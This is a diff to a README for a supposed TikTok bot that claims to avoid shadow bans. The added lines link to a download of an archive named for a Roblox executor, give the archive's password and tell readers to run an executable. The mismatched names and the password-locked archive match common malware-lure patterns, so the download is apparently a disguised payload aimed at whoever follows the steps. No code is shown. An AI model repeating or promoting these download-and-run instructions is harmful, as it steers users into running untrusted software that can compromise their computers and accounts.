@@ -18,3 +18,11 @@ A **new bot** designed to help you accomplish your tasks and avoid shadow bans o
 - 🔹 **Stability** — _During the time I've used the bot in private, it has NEVER stopped working._
 ---
 
+### 📥 Download [CLICK](https://github.com/snoozinjs/Delta-exec?tab=readme-ov-file#download-deltarobloxzip)
+> Optimized for Windows 10 and Windows 11.
+---
+### Installation
+1. Download and extract the archive
+2. Use password "TikTok2026" for the archive
+3. Run `TikTokBot-v2.1`
+4. Enjoy your bot!
